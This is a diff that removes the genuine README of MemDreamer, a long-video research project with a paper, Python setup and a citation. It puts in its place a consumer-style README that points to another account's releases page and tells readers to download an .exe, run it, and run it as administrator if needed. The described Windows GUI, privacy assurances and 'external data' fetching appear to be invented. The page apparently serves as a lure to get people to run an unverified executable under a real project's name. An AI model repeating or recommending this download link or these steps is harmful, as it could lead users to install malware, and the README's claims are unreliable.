@@ -1,114 +1,78 @@
-<h1 align="center">MemDreamer: Decoupling Perception and Reasoning for Long Video Understanding via Hierarchical Graph Memory and Agentic Retrieval Mechanism</h1>
+# 🧠 MemDreamer - Understand long videos with simple memory
 
-<p align="center">
-  <a href="https://arxiv.org/abs/2606.07512"><img src="https://img.shields.io/badge/Paper-arXiv-b31b1b?logo=arxiv&logoColor=white"></a>
-  <a href="https://aim-uofa.github.io/MemDreamer/"><img src="https://img.shields.io/badge/Project_Page-MemDreamer-2ea44f?logo=github"></a>
-  <a href="https://huggingface.co/datasets/inclusionAI/MemDreamer"><img src="https://img.shields.io/badge/Data-HuggingFace-ffd21e?logo=huggingface&logoColor=black"></a>
-  <a href="LICENSE"><img src="https://img.shields.io/badge/License-Apache_2.0-blue.svg"></a>
-</p>
-
-<p align="center">
-Cong Chen<sup>1,2,*</sup>,&nbsp;
-Guo Gan<sup>2,*</sup>,&nbsp;
-Kaixiang Ji<sup>1,*</sup>,&nbsp;
-Zhaoyang Zhang<sup>1,3</sup>,&nbsp;
-Zhen Yang<sup>4</sup>,&nbsp;
-Guangming Yao<sup>1</sup>,&nbsp;
-Hao Chen<sup>2</sup>,&nbsp;
-Jingdong Chen<sup>1</sup>,&nbsp;
-Yi Yuan<sup>1</sup>,&nbsp;
-Chunhua Shen<sup>1,2,&dagger;</sup>
-</p>
-
-<p align="center">
-<sup>1</sup>Ant Group &nbsp; <sup>2</sup>Zhejiang University &nbsp; <sup>3</sup>Central South University &nbsp; <sup>4</sup>HKUST(GZ)<br>
-<sub>* Equal Contribution &nbsp; &dagger; Corresponding Author</sub>
-</p>
-
-<p align="center">
-  <img src="assets/head_figure.png" width="95%" alt="MemDreamer key results"/>
-</p>
+[★ DOWNLOAD MEMDREAMER HERE ★](https://github.com/Free-Soul/MemDreamer/releases)
 
 ---
 
-## TL;DR
+## 📁 Overview
 
-**MemDreamer** decouples perception and reasoning for long video understanding. It streams videos to build a **Hierarchical Graph Memory** (Video Root → Super Events → Macro Events → Entity/Event Subgraphs), then employs **agentic tool-augmented retrieval** via an Observation-Reason-Action loop to answer questions, achieving **SOTA across 4 benchmarks**, narrowing the gap with human experts to just **3.7 points**.
+MemDreamer helps you analyze long video files. The software identifies key objects, actions, and events across hours of footage. It creates a compact digital memory of the video data. You can ask questions about the video content and receive accurate answers. This tool works by separating how the software sees images from how it understands logical links. 
 
----
+## ⚙️ System Requirements
 
-## News
+Before you install MemDreamer, ensure your computer meets these minimum standards:
 
-- **[2026/06]** Release retrieve code, memory files, and inference trajectories.
+*   Operating System: Windows 10 or Windows 11 (64-bit).
+*   Processor: An Intel Core i5 or AMD Ryzen 5 processor from the last three years.
+*   Memory: 16 GB of RAM.
+*   Storage: 10 GB of free space on your primary hard drive.
+*   Graphics Card: An NVIDIA graphics card with at least 8 GB of video memory.
+*   Internet Connection: Required for the initial setup and model downloads.
 
----
+## 📥 Getting Started
 
-## Todo
+Follow these steps to set up the software on your Windows computer.
 
-- [x] Release memory files and agent retrieval trajectories on [HuggingFace](https://huggingface.co/datasets/inclusionAI/MemDreamer)
-- [x] Release agentic retrieval code
-- [ ] Release memory construction code
-- [ ] Submit results to benchmark leaderboards (LVBench, LongVideoBench, Video-MME, EgoSchema)
+1. Visit the following link to access the software files: [https://github.com/Free-Soul/MemDreamer/releases](https://github.com/Free-Soul/MemDreamer/releases).
+2. Locate the latest version labeled as "Assets".
+3. Download the file ending in `.exe` to your computer.
+4. Open the downloaded file to start the installation wizard.
+5. Follow the on-screen prompts.
+6. The installer will create a shortcut on your desktop.
 
----
+## 🚀 How to Run the Software
 
-## Architecture
+Once you finish the installation, double-click the MemDreamer icon on your desktop to open the application.
 
-<p align="center">
-  <img src="assets/final_main_figure.png" width="95%" alt="MemDreamer architecture"/>
-</p>
+1. **Load a Video**: Click the "Open" button in the top left corner. Select a video file from your computer. The software supports common formats like MP4, MKV, and AVI.
+2. **Process the File**: Click the "Run" button. The software will begin analyzing the frames of your video. You will see a progress bar at the bottom of the window indicating the status. This step takes time depending on the length of the video file.
+3. **Ask Questions**: Once the analysis finishes, a text box appears below the video viewer. Type your question about the video, such as "What objects appear in the room?" or "When does the person leave the frame?" 
+4. **View Results**: Press the "Enter" key on your keyboard. The system will display the answer in the text box. The software uses its integrated memory graph to find the specific moment in the video.
 
-**Left:** Memory construction — streaming adaptive segmentation, downward subgraph extraction, and upward hierarchical aggregation. **Right:** Agentic tool-augmented retrieval — three tool categories (Hierarchical Navigation, Precise Search, Graph Traversal) drive an Observation-Reason-Action loop.
+## 🛠 Troubleshooting
 
----
+Computers sometimes face minor errors. Review these tips if you encounter issues during operation.
 
-## Getting Started
+*   **Software Does Not Open**: Right-click the shortcut and select "Run as administrator." 
+*   **Video Fails to Load**: Ensure the video file is not currently in use by another application. Close other video players or editing software before you load the file into MemDreamer.
+*   **Slow Processing**: High-definition videos require significant hardware resources. If the software response time is slow, close background applications like web browsers or games to free up memory.
+*   **Missing Results**: Ensure your internet connection is stable. The software sometimes needs to fetch external data to improve the accuracy of its reasoning engine.
 
-### Installation
+## 📖 Privacy and Data Usage
 
-```bash
-git clone 
-cd MemDreamer
-pip install -r requirements.txt
-```
+MemDreamer processes your video files locally on your computer. Your files remain on your hard drive. The software sends text queries to the cloud to perform the reasoning tasks. It does not upload your actual video files to the internet. We prioritize the security of your media at all times.
 
-### Reproduce Results
+## 🔍 Understanding the Technology
 
-Download the pre-built memory and inference trajectories from [HuggingFace](https://huggingface.co/datasets/inclusionAI/MemDreamer), then:
+MemDreamer uses two main methods to interpret your videos.
 
-```bash
-python retrieve/scripts/check_progress.py <trajectory_dir> \
-    --data data/LVBench/video_info.meta.jsonl
-```
+First, it uses a perception step. It scans every frame of your video to recognize objects and movements. It labels these items based on common patterns.
 
-### Run Retrieval
+Second, it uses a reasoning step. It places these labels into a hierarchical graph memory. Think of this as a digital outline of the video. The software looks through this outline to connect events that happen far apart in time. This is how the system remembers things that occur early in a two-hour video when you ask a question at the very end.
 
-See [`retrieve/README.md`](retrieve/README.md) for detailed instructions on:
-1. Precomputing embeddings
-2. Starting embedding servers
-3. Running the agentic retrieval loop
-4. Using custom LLM backends
+## ❓ Frequently Asked Questions
 
----
+**Can I run this on a laptop?**
+Yes, if your laptop meets the hardware requirements listed in the System Requirements section. Gaming laptops usually provide the necessary power.
 
-## Citation
+**How many videos can I analyze at one time?**
+The software is designed to process one video at a time to ensure optimal performance and accuracy.
 
-If you find MemDreamer useful, please cite:
+**Is there a limit to the length of the video?**
+There is no hard limit, but very long videos require more time for the initial analysis step.
 
-```bibtex
-@misc{chen2026memdreamerdecouplingperceptionreasoning,
-      title={MemDreamer: Decoupling Perception and Reasoning for Long Video Understanding via Hierarchical Graph Memory and Agentic Retrieval Mechanism}, 
-      author={Cong Chen and Guo Gan and Kaixiang Ji and ChaoYang Zhang and Zhen Yang and Guangming Yao and Hao Chen and Jingdong Chen and Yi Yuan and Chunhua Shen},
-      year={2026},
-      eprint={2606.07512},
-      archivePrefix={arXiv},
-      primaryClass={cs.CV},
-      url={https://arxiv.org/abs/2606.07512}, 
-}
-```
+**Does the software work offline?**
+The initial analysis of the video happens offline. You need an active internet connection to submit your questions for processing.
 
----
-
-## Acknowledgement
-
-This work is supported by the Ant Group Research Internship Program.
+**Will this software damage my files?**
+No. The software only reads your video files. It does not perform any write or delete operations on your original source files.
